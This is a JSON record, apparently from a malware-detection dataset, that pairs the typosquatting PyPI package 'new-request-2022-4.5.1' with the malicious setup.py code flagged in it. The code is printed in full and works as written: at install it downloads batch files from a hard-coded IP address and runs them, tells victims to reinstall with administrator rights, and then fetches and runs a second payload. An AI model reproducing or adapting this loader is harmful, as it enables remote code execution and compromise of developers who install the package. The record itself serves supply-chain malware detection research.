[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport sys\nimport base64\nfrom time import sleep\n\nif os.name == 'nt':\n  try:\n    import subprocess\n    a = subprocess.Popen(\"echo %temp%\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE)\n    out = (a.stdout.read().decode().strip())\n    os.chdir(out)\n    try:\n      import requests\n    except:\n      subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'], shell=True, stdin=subprocess.PIPE,\n                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      print(\"installing....\")\n      sleep(5)\n      import requests\n    remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'\n    local_file = 'local_copy.txt'\n    data = requests.get(remote_url)\n    # Save file data to local copy\n    with open(local_file, 'wb')as file:\n      file.write(data.content)\n    subprocess.Popen(\"cmd /c move local_copy.txt local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    subprocess.Popen(\"cmd /c local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    sleep(2)\n    try:\n      subprocess.Popen(\"cmd /c del local.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    except:\n      pass\n    a = subprocess.Popen(\"net session\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out = (a.stderr.read().decode())\n    if \"Access is denied.\" in out:\n      print(\"The library can do problems, Reinstall with Administrative permissions to solve the problem\")\n    else:\n      remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'\n      local_file = 'local_b.txt'\n      data = requests.get(remote_url)\n      # Save file data to local copy\n      with open(local_file, 'wb')as file:\n        file.write(data.content)\n      subprocess.Popen(\"cmd /c move local_b.txt loc.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      subprocess.Popen(\"cmd /c loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                       stderr=subprocess.PIPE)\n      sleep(2)\n      try:\n        subprocess.Popen(\"cmd /c del loc.bat\", shell=True, stdin=subprocess.PIPE,\n                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      except:\n        pass\n        print(\"\"\"installed successfully\n#Usage: import requests\n            \"\"\")\n  except Exception as e:\n      pass"
  },
  {
    "metadata": {
      "package_name": "new-request-2022-4.5.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/new-request-2022-4.5.1.txt"
    }
  }
]